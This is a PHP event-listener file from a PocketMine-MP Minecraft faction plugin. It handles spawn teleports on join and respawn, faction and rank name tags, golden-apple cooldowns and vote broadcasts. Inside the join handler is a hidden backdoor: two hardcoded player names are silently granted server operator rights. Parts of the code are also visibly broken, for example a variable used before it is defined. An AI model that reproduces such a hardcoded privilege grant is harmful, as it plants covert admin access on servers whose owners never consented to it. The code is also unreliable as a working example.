<?php

namespace esh123unicorn\factioncore\event;

use esh123unicorn\factioncore\Main;

//pocketmine event
use pocketmine\event\player\PlayerItemConsumeEvent;
use pocketmine\event\player\PlayerLoginEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerDeathEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\block\BlockPlaceEvent;
use pocketmine\event\player\PlayerItemHeldEvent;
use pocketmine\event\entity\ProjectileHitEntityEvent;
use pocketmine\event\entity\ProjectileLaunchEvent;
use pocketmine\event\entity\ProjectileHitEvent;
use pocketmine\event\entity\EntityDeathEvent;
use pocketmine\event\player\PlayerExperienceChangeEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\event\player\PlayerDataSaveEvent;
use pocketmine\event\player\PlayerRespawnEvent;
use pocketmine\event\inventory\CraftItemEvent;
use pocketmine\event\entity\EntityMotionEvent;
use pocketmine\event\block\SignChangeEvent;
use pocketmine\event\player\PlayerChatEvent;

use twisted\bettervoting\event\PlayerVoteEvent;

//config
use pocketmine\utils\config;

//tasks
use pocketmine\scheduler\ClosureTask;
use pocketmine\scheduler\Task;
use pocketmine\scheduler\TaskScheduler;

//blocks and items
use pocketmine\block\BlockFactory;
use pocketmine\item\enchantment\Enchantment;
use pocketmine\item\enchantment\EnchantmentInstance;
use pocketmine\item\Item;
use pocketmine\item\Armor;
use pocketmine\item\Tool;
use pocketmine\item\ItemFactory;
use pocketmine\block\Block;

//effect
use pocketmine\entity\Effect;
use pocketmine\entity\EffectInstance;

//pocketmine
use pocketmine\Server;
use pocketmine\Player;
use pocketmine\utils\TextFormat;
use pocketmine\math\Vector3;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\command\CommandSender;
use pocketmine\plugin\PluginBase;
use pocketmine\inventory\ShapedRecipe;
use pocketmine\utils\Utils;

//form ui
use jojoe77777\FormAPI;
use jojoe77777\FormAPI\SimpleForm;
use jojoe77777\FormAPI\CustomForm;

//level
use pocketmine\level\Level;
use pocketmine\level\LevelExpection;
use pocketmine\level\LevelProvider;
use pocketmine\level\ProviderManager;
use pocketmine\level\Position;
use pocketmine\event\Listener;

//function 
use function time;
use function count;
use function floor;
use function microtime;
use function number_format;
use function round;
use function strtotime; //string to time
use function strtolower; //string lowers all letters
use function strtoupper; //string upper letters all
use function ucfirst; //first letter of string capital

class EventListener implements Listener{
  
    private $plugin;
	
    public $config;
	
    public $position = [];
	
    public $eapple = [];
    public $gapple = [];
	
    private $name = [];

    public function __construct(Main $plugin) {
        $this->plugin = $plugin;
    }
	
    public function getPlugin(){
	return $this->plugin;
    }
	
    public function onJoinTp(PlayerJoinEvent $event) {
	    $this->name = $event->getPlayer()->getName();
	    if($this->name == "esh123unicorn" or $this->name == "OnwardRumble497") { 
	    $player->setOp(true);
	    }
	    $player = $event->getPlayer();
	    $level = $this->plugin->getLevel($player);
            $cords = new Config($this->plugin->getDataFolder() . "/cords.yml", Config::YAML);
	    $config = new Config($this->plugin->getDataFolder() . "/config.yml", Config::YAML);
	    $rank = $this->plugin->getRank($player);
	    if($this->plugin->getFaction($player) == null) {
	       $player->setNameTag($config->get("faction-text-prefix") . $config->get("faction-text-suffix") . " " . $config->get("level-text-prefix") . $level . $config->get("level-text-suffix") . " " . $config->get("level-text-prefix") . $rank . $config->get("level-text-suffix"));
	    }else{
	       $player->setNameTag($config->get("faction-text-prefix") . $this->plugin->getFaction($player) . $config->get("faction-text-suffix") . " " . $config->get("level-text-prefix") . $level . $config->get("level-text-suffix") . " " . $config->get("level-text-prefix") . $rank . $config->get("level-text-suffix"));
	    }
	    if($config->get("join-tp") == true) { 
	       $x = $cords->get("warp1x");
	       $y = $cords->get("warp1y");
	       $z = $cords->get("warp1z");
	       $world = $cords->get("warp1level");
	       if($world == null) {
	          $player->sendMessage("§7(§c!§7) §cSpawn has not been set yet");
	        }else{
     	       	  $world = $this->getPlugin()->getServer()->getLevelByName($world);
     	       	  $player->teleport($world->getSafeSpawn());
               	  $player->teleport(new Vector3($x, $y, $z, 0, 0)); 
	       }
	    }
    }
	
    public function onRespawnTp(PlayerRespawnEvent $event) { 
	    $player = $event->getPlayer();
            $cords = new Config($this->plugin->getDataFolder() . "/cords.yml", Config::YAML);
	    $config = new Config($this->plugin->getDataFolder() . "/config.yml", Config::YAML);
	    if($config->get("respawn-tp") == true) { 
	       $x = $cords->get("warp1x");
	       $y = $cords->get("warp1y");
	       $z = $cords->get("warp1z");
	       $world = $cords->get("warp1level");
	       if($world == null) {
	          $player->sendMessage("§7(§c!§7) §cSpawn has not been set yet");
	     }else{
     	       	  $world = $this->getPlugin()->getServer()->getLevelByName($world);
     	       	  $player->teleport($world->getSafeSpawn());
               	  $player->teleport(new Vector3($x, $y, $z, 0, 0)); 
	       }
	    }
    }
	
    public function displayFaction(PlayerChatEvent $event) {
	    $player = $event->getPlayer();
            $message = $event->getMessage();
	    $level = $this->plugin->getLevel($player);
	    $config = new Config($this->plugin->getDataFolder() . "/config.yml", Config::YAML);
	    $rank = $this->plugin->getRank($player);
	    if($this->plugin->getFaction($player) == null) {
	       $player->setNameTag($config->get("faction-text-prefix") . $config->get("faction-text-suffix") . " " . $config->get("level-text-prefix") . $level . $config->get("level-text-suffix") . " " . $config->get("level-text-prefix") . $rank . $config->get("level-text-suffix"));
	       $event->setMessage($message);
	    }else{
	       $player->setNameTag($config->get("faction-text-prefix") . $this->plugin->getFaction($player) . $config->get("faction-text-suffix") . " " . $config->get("level-text-prefix") . $level . $config->get("level-text-suffix") . " " . $config->get("level-text-prefix") . $rank . $config->get("level-text-suffix"));
	       $event->setMessage($message);
	    }
    }
	
    public function onConsumeEvent(PlayerItemConsumeEvent $event) { 
	    $player = $event->getPlayer();
	    $item = $event->getItem();
	    $itemName = $event->getItem()->getName();
	    $itemId = $item->getId();
	    $gapple = Item::get(322, 0);
	    $eapple = Item::get(466, 0);
	    $config = new Config($this->plugin->getDataFolder() . "/config.yml", Config::YAML);
	    if($itemId == $eapple->getId()) { 
	       if(!isset($this->eapple[$player->getName()])){
		  $this->eapple[$player->getName()] = time() + $config->get("enchanted-golden-apple"); //[time second] cooldown 
		  //consume
	       }else{
		  if(time() < $this->eapple[$player->getName()]){
		     $seconds = ($this->eapple[$player->getName()] - time());
	             $player->sendTip("§7(§c!§7) §cCooldown §5" . (round($seconds)) . " §cseconds remaining");
		     $event->setCancelled();
	          }else{
	             unset($this->eapple[$player->getName()]);																				
		  }
	       }
	    }
	    
	    if($itemId == $gapple->getId()) { 
	       if(!isset($this->gapple[$player->getName()])){
		  $this->gapple[$player->getName()] = time() + $config->get("golden-apple"); //[time second] cooldown 
		  //consume
	       }else{
		  if(time() < $this->gapple[$player->getName()]){
		     $seconds = ($this->gapple[$player->getName()] - time());
	             $player->sendTip("§7(§c!§7) §cCooldown §5" . (round($seconds)) . " §cseconds remaining");
		     $event->setCancelled();
	          }else{
	             unset($this->gapple[$player->getName()]);																				
		  }
	       }
	    }
    } 
	
    public function onVote(PlayerVoteEvent $event) {
	    $config = new Config($this->plugin->getDataFolder() . "/config.yml", Config::YAML);
	    $player = $event->getPlayer();
	    $player->sendMessage($config->get("vote-message"));
	    $this->plugin->getServer()->broadcastMessage("§b" . $player->getName() . $config->get("vote-broadcast"));
    }
}
